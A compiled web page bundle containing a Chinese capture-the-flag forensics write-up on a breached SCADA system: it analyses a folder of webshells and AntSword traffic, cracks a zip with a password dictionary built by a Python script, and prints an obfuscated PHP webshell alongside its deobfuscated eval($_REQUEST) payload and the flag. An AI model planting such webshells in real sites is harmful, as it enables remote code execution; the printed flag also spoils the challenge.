"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8738],{77771:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"Independent-Environment/Fengtaisec/9","title":"\u9690\u85cf\u7684\u9ed1\u5ba2","description":"\u6839\u636e\u60c5\u62a5\u5f97\u77e5\u5de5\u63a7\u73b0\u573a\u53d1\u73b0\u67d0 SCADA \u7cfb\u7edf\u88ab\u9ed1\u5ba2\u653b\u7834, \u9644\u4ef6\u4e3a\u9ed1\u5ba2\u5728\u76ee\u5f55\u7559\u4e0b\u7684\u6587\u4ef6\u548c\u5f53\u65f6\u65f6\u95f4\u6bb5\u6355\u83b7\u5230\u7684\u4e00\u90e8\u5206\u6d41\u91cf\u5305, \u4f60\u80fd\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u5206\u6790\u51fa\u86db\u4e1d\u9a6c\u8ff9\u6765\u4e48","source":"@site/docs/Independent-Environment/Fengtaisec/9.md","sourceDirName":"Independent-Environment/Fengtaisec","slug":"/Independent-Environment/Fengtaisec/9","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Fengtaisec/9","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/Fengtaisec/9.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"\u5de5\u63a7\u871c\u7f50\u65e5\u5fd7\u5206\u6790","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Fengtaisec/6"},"next":{"title":"\u5185\u5b58\u955c\u50cf\u5206\u6790","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/Fengtaisec/93"}}');var r=s(74848),c=s(28453);const i={},a="\u9690\u85cf\u7684\u9ed1\u5ba2",o={},d=[];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",header:"header",img:"img",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"\u9690\u85cf\u7684\u9ed1\u5ba2",children:"\u9690\u85cf\u7684\u9ed1\u5ba2"})}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"\u6839\u636e\u60c5\u62a5\u5f97\u77e5\u5de5\u63a7\u73b0\u573a\u53d1\u73b0\u67d0 SCADA \u7cfb\u7edf\u88ab\u9ed1\u5ba2\u653b\u7834, \u9644\u4ef6\u4e3a\u9ed1\u5ba2\u5728\u76ee\u5f55\u7559\u4e0b\u7684\u6587\u4ef6\u548c\u5f53\u65f6\u65f6\u95f4\u6bb5\u6355\u83b7\u5230\u7684\u4e00\u90e8\u5206\u6d41\u91cf\u5305, \u4f60\u80fd\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u5206\u6790\u51fa\u86db\u4e1d\u9a6c\u8ff9\u6765\u4e48"}),(0,r.jsxs)(n.p,{children:["flag \u5f62\u5f0f\u4e3a ",(0,r.jsx)(n.code,{children:"flag{}"})]})]}),"\n",(0,r.jsxs)(n.p,{children:["\u9898\u76ee\u63d0\u4f9b\u4e86 ",(0,r.jsx)(n.code,{children:"upload"})," \u6587\u4ef6\u5939\u4ee5\u53ca ",(0,r.jsx)(n.code,{children:"1.pcapng"})," \u6d41\u91cf\u5305\u6587\u4ef6"]}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u6587\u4ef6\u5939\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u5927\u91cf\u7684 Webshell \u6587\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u6d41\u91cf\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u8681\u5251\u7684 Webshell \u4ea4\u4e92\u6d41\u91cf"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(41753).A+"",width:"1711",height:"1436"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u90e8\u5206\uff0c\u653b\u51fb\u8005\u8bfb\u53d6\u4e86 ",(0,r.jsx)(n.code,{children:"/var/www/html/webshell.zip"})," \u6587\u4ef6\u7684\u5185\u5bb9"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(88249).A+"",width:"1711",height:"1436"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06 ",(0,r.jsx)(n.code,{children:"/var/www/html/webshell.zip"})," \u7684\u6570\u636e\u63d0\u53d6\u51fa\u6765\u89e3\u6790"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(94313).A+"",width:"1626",height:"947"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\u538b\u7f29\u5305\u5b58\u5728\u6709\u5bc6\u7801"}),"\n",(0,r.jsxs)(n.p,{children:["\u8054\u60f3\u5230\u5bc6\u7801\uff0c\u53ef\u4ee5\u6ce8\u610f ",(0,r.jsx)(n.code,{children:"upload"})," \u6587\u4ef6\u5939\u5185\u5b58\u5728\u6709\u5927\u91cf\u7684 Webshell \u6587\u4ef6\uff0c\u5c06\u5176\u4e2d\u7684\u8fde\u63a5\u5bc6\u7801\u63d0\u53d6\u4e3a\u5b57\u5178"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import os\n\nfile_folder = "D:/Downloads/attachment_1579250492_upload/upload"\n\npass_dict = []\n\nfor filename in os.listdir(file_folder):\n    file_path = os.path.join(file_folder, filename)\n    with open(file_path, "r") as f:\n        file_data = f.read().strip()\n        pass_dict.append(file_data.split("[")[-1].split("]")[0])\n\nwith open("webshell-pass.txt", "w+") as f:\n    f.write("\\n".join(pass_dict))\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06\u63d0\u53d6\u51fa\u6765\u7684 ",(0,r.jsx)(n.code,{children:"webshell-pass.txt"})," \u6587\u4ef6\u4f5c\u4e3a\u5b57\u5178\u8fdb\u884c\u7206\u7834\uff0c\u5f97\u5230 ``webshell.zip` \u538b\u7f29\u5305\u7684\u5bc6\u7801"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(11870).A+"",width:"691",height:"961"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f97\u5230\u538b\u7f29\u5305\u7684\u5bc6\u7801\u4e3a",(0,r.jsx)(n.code,{children:"7b8b965ad4bca"})]}),"\n",(0,r.jsx)(n.p,{children:"\u89e3\u538b\u538b\u7f29\u5305\uff0c\u5f97\u5230"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\nerror_reporting(0);\n\n@$c = array("1JFUVVFU1RbJzlhNzJjM","2Q1ZTc0ZjYwNTFiYjNiMzU","5MGZhOTMxOWZlJ10pOw","MGZhOTMxOWZlJ","MGZhOTMxOWZlJ");\n@$str="ZXZhbCgkX";\n@$o0o00o00o00o0o0 = chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);\n@$ooo00o0o0o0o0o0 = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);\n@$count = 0;\nfor($x=0;$x<=9;$x++){\n        if (in_array($x, @$c)){\n                @$str=@$str.@$c[@$count];\n                if ($count == 2)\n                {       \n                        @$o0o00o00o00o0o0(@$ooo00o0o0o0o0o0(@$str));\n                }\n                @$count++;\n        }\n}\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u5176\u8fdb\u884c\u89e3\u6df7\u6dc6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\nerror_reporting(0);\n\n@$c = array("1JFUVVFU1RbJzlhNzJjM","2Q1ZTc0ZjYwNTFiYjNiMzU","5MGZhOTMxOWZlJ10pOw","MGZhOTMxOWZlJ","MGZhOTMxOWZlJ");\n@$str="ZXZhbCgkX";\n@$count = 0;\nfor($x=0;$x<=9;$x++){\n        if (in_array($x, @$c)){\n                @$str=@$str.@$c[@$count];\n                if ($count == 2)\n                {       \n                        assert(base64_decode(@$str));\n                }\n                @$count++;\n        }\n}\n?>\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f97\u5230\u5176\u8f7d\u8377 ",(0,r.jsx)(n.code,{children:"eval($_REQUEST['9a72c3d5e74f6051bb3b3590fa9319fe']);"})]}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{9a72c3d5e74f6051bb3b3590fa9319fe}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},41753:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20241217-231721-952d790a243947df9c2a3e8a503be2fc.png"},88249:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20241220-232025-969b2b898cc6216f7e7b8bcf98256ba1.png"},94313:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20241222-232225-379c098d99a3c659c29bd55dc49a3520.png"},11870:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20241232-233246-6e7c8125ae03023011adc0c2893baa04.png"},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>a});var t=s(96540);const r={},c=t.createContext(r);function i(e){const n=t.useContext(c);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),t.createElement(c.Provider,{value:n},e.children)}}}]);